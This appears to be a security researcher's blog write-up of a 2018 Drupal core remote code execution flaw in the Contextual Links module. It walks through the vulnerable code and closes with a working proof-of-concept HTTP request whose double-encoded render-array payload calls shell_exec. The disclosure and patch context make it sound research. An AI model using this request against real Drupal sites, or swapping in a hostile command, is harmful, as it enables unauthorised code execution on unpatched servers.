---
layout: default
title: Drupal Core PHP Code Injection
categories: security
---

# Drupal Core PHP Code Injection

## Drupal Overview and History

Drupal is a content management system. In March of 2018, a vulnerability dubbed Drupalgeddon2 was announced ([CVE-2018-7600](https://nvd.nist.gov/vuln/detail/cve-2018-7600), [SA-CORE-2018-002](https://www.drupal.org/sa-core-2018-002)) that enabled an unauthenticated attacker to achieve remote code execution on most versions of Drupal with default configuration.

The vulnerability was caused by Drupal's [render arrays](https://www.drupal.org/docs/drupal-apis/render-api/render-arrays). Render arrays are just ordinary PHP arrays, except that keys that start with # are given special processing that allow code execution by design. These generally aren't meant to come from user input, so the Drupal maintainers patched this by implementing a broad [RequestSanitizer](https://github.com/drupal/drupal/blob/8.6.1/core/lib/Drupal/Core/Security/RequestSanitizer.php). The sanitizer runs early in the page load and strips array keys that begin with # from the query string.

Additional paths for exploitation were found in April 2018 ([SA-CORE-2018-004](https://www.drupal.org/sa-core-2018-004)) and the RequestSanitizer was expanded to process the request body and cookies as well.

## Search
The knowledge that something like Drupalgeddon2 could be lurking in the codebase for so long motivated me to begin looking for my own RCE in Drupal in my free time.

I made a spreadsheet of every URL route in Drupal and initially focused on routes available to unauthenticated users. After a few weeks without success, I started looking at routes that required low-level user permissions, and pretty quickly found an issue in the core Contextual Links module.

## Vector
The [Contextual Links module](https://www.drupal.org/docs/8/core/modules/contextual/working-with-contextual-links) enables users to edit content or perform other tasks while browsing their site without navigating to the administrator UI.

![Person using contextual links module](/assets/contextual-menu.gif "Image from Drupal.org under the <a href='https://www.drupal.org/terms'>Creative Commons License, Attribution-ShareAlike 2.0</a>")

As the functionality is used in several different contexts, the controller that handles rendering them is very generic.

```php
  /**
   * Returns the requested rendered contextual links.
   *
   * Given a list of contextual links IDs, render them. Hence this must be
   * robust to handle arbitrary input.
   */
  public function render(Request $request) {
    $ids = $request->request->get('ids');
    if (!isset($ids)) {
      throw new BadRequestHttpException(t('No contextual ids specified.'));
    }

    $rendered = [];
    foreach ($ids as $id) {
      $element = [
        '#type' => 'contextual_links',
        '#contextual_links' => _contextual_id_to_links($id),
      ];
      $rendered[$id] = $this->renderer->renderRoot($element);
    }

    return new JsonResponse($rendered);
  }
```

We can see that user input from the `ids` parameter in the request POST body is processed by `_contextual_id_to_links` before being added to a render array. The render array is then rendered and the result is returned to the user. Let's look at `_contextual_id_to_links`.

```php
/**
 * Unserializes the result of _contextual_links_to_id().
 *
 * @see _contextual_links_to_id
 *
 * @param string $id
 *   A serialized representation of a #contextual_links property value array.
 *
 * @return array
 *   The value for a #contextual_links property.
 */
function _contextual_id_to_links($id) {
  $contextual_links = [];
  $contexts = explode('|', $id);
  foreach ($contexts as $context) {
    list($group, $route_parameters_raw, $metadata_raw) = explode(':', $context);
    parse_str($route_parameters_raw, $route_parameters);
    $metadata = [];
    parse_str($metadata_raw, $metadata);
    $contextual_links[$group] = [
      'route_parameters' => $route_parameters,
      'metadata' => $metadata,
    ];
  }
  return $contextual_links;
}
```

Here we see the user-provided id is split into three parts separated by :. The latter two parts are then passed through the PHP [parse_str](https://www.php.net/manual/en/function.parse-str.php) which treats them as a URL-encoded query string.

At this point it might seem like all we need to do is pass a double-URL-encoded query string in for one of these parameters and we'll have our render array injection, but if I recall correctly, that didn't work. However, the metadata parameter receives further processing later on that provides another avenue.

```php
/**
 * Implements hook_contextual_links_view_alter().
 *
 * @see \Drupal\contextual\Plugin\views\field\ContextualLinks::render()
 */
function contextual_contextual_links_view_alter(&$element, $items) {
  if (isset($element['#contextual_links']['contextual'])) {
    $encoded_links = $element['#contextual_links']['contextual']['metadata']['contextual-views-field-links'];
    $element['#links'] = Json::decode(rawurldecode($encoded_links));
  }
}
```

By passing a JSON encoded array for the `contextual-views-field-links` subparameter of `metadata`, we can inject a render array while evading the `RequestSanitizer`.

## Proof of Concept
The POC below requires the ‘Access Contextual Links' permission to be granted to unauthenticated users.

```http
POST /contextual/render HTTP/1.1
Host: local.test
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 906

ids[]=contextual::contextual-views-field-links=%257B%250A%2520%2520%2520%2520%2522asdf%2522%253A%250A%2520%2520%2520%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2522title%2522%253A%2520%257B%2522%2523lazy_builder%2522%253A%2520%255B%2522shell_exec%2522%252C%2520%255B%2522touch%2520%252Ftmp%252Fhellofromviews%2522%255D%255D%257D%252C%250A%2520%2520%2520%2520%2520%2520%2520%2520%2522href%2522%253A%2520%2522asdf%2522%252C%250A%2520%2520%2520%2520%2520%2520%2520%2520%2522attributes%2522%253A%250A%2520%2520%2520%2520%2520%2520%2520%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2522class%2522%253A%255B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2522use-ajax%2522%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%255D%250A%2520%2520%2520%2520%2520%2520%2520%2520%257D%250A%2520%2520%2520%2520%257D%250A%257D
```

The payload corresponds to a double-URL-encoding of this:

```json
{
    "asdf":
    {
        "title": {"#lazy_builder": ["shell_exec", ["touch /tmp/hellofromviews"]]},
        "href": "asdf",
        "attributes":
        {
            "class":[
                "use-ajax"
            ]
        }
    }
}
```

When the array is rendered, shell_exec is called and a file is created in the tmp directory as proof.

## Patch
The issue was patched by returning an HMAC code along with the contextual links id list at the time it's generated, and then taking that code as an additional parameter at render time and validating it.

## Timeline
* August 29, 2018 08:50 PM - Reported to Drupal security team
* August 30, 2018 12:57 AM - Report validated by Drupal security team
* October 17, 2018 - Fix released in Drupal 8.5.8 and Drupal 8.6.2 ([DRUPAL-SA-CORE-2018-006](https://www.drupal.org/sa-core-2018-006))
